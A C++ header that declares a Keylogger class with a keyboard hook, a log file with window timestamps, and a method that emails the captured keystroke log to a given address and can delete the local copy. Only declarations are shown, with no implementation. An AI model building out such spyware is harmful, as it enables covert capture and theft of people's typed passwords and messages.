#pragma once

#include "Hook.h"

class Keylogger {
public:
	Keylogger();
	void start();
	void stop();
	~Keylogger();

	bool sendEmailReport(std::wstring emailTo, bool deleteLocal);
private:
	std::wstring logfilePath;
	std::shared_ptr<Hook> hook;
	bool isActive;
	std::wofstream logFile;
	HWND lastActiveWindow;

	void keyboardHandler(const wchar_t* key);
	void addWindowTimeStamps();
};

